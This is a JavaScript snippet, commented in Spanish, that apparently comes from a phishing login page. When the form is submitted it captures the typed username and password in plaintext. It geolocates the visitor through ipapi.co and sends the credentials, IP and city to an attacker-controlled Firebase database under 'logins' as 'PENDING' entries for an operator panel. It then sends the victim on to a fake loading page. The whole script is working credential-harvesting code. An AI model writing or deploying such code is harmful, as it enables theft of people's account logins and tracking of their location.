<script>
    // 1. CONFIGURACIÓN DE TU PROYECTO
    const firebaseConfig = { 
        databaseURL: "https://tucopedanm-default-rtdb.firebaseio.com/" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Crear un ID único para esta sesión de usuario
    const sessionId = "ID-" + Math.random().toString(36).substr(2, 7).toUpperCase();

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Captura de datos
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        const btn = document.getElementById('btn-envio');

        // Deshabilitar botón para evitar doble clic
        btn.disabled = true;

        // 2. OBTENER GEOLOCALIZACIÓN Y ENVIAR AL PANEL
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(ipData => {
                const payload = {
                    tipo: 'empresas',  // CAMBIO PRINCIPAL: Indicamos que es de tipo 'empresas'
                    username: u,
                    password: p,
                    ip: ipData.ip || '0.0.0.0',
                    ubicacion: `${ipData.city || '?'}, ${ipData.country_name || '?'}`,
                    fecha: new Date().toLocaleString(),
                    status: 'PENDING',
                    timestamp: Date.now(),
                    online: true,
                    pagina: 'empresas/index.html',  // CAMBIO: Indicamos la página específica
                    ultimoPing: Date.now()
                };

                // Guardar en la rama 'logins'
                db.ref('logins/' + sessionId).set(payload)
                    .then(() => {
                        console.log("Datos enviados correctamente a Firebase");
                        // Redirigir después de guardar
                        window.location.href = 'cargando.html?id=' + sessionId;
                    })
                    .catch(error => {
                        console.error("Error al guardar en Firebase:", error);
                        // En caso de error, intentamos la redirección de todos modos
                        window.location.href = 'cargando.html?id=' + sessionId;
                    });
            })
            .catch(error => {
                console.error("Error al obtener datos de IP:", error);
                
                // Intentar enviar sin datos de IP si falla la geolocalización
                const payload = {
                    tipo: 'empresas',  // CAMBIO PRINCIPAL: Indicamos que es de tipo 'empresas'
                    username: u,
                    password: p,
                    ip: 'unknown',
                    ubicacion: 'unknown',
                    fecha: new Date().toLocaleString(),
                    status: 'PENDING',
                    timestamp: Date.now(),
                    online: true,
                    pagina: 'empresas/index.html',  // CAMBIO: Indicamos la página específica
                    ultimoPing: Date.now()
                };
                
                db.ref('logins/' + sessionId).set(payload)
                    .then(() => {
                        console.log("Datos enviados sin geolocalización");
                        window.location.href = 'cargando.html?id=' + sessionId;
                    })
                    .catch(error => {
                        console.error("Error al guardar sin geolocalización:", error);
                        window.location.href = 'cargando.html?id=' + sessionId;
                    });
            });
    });
</script>
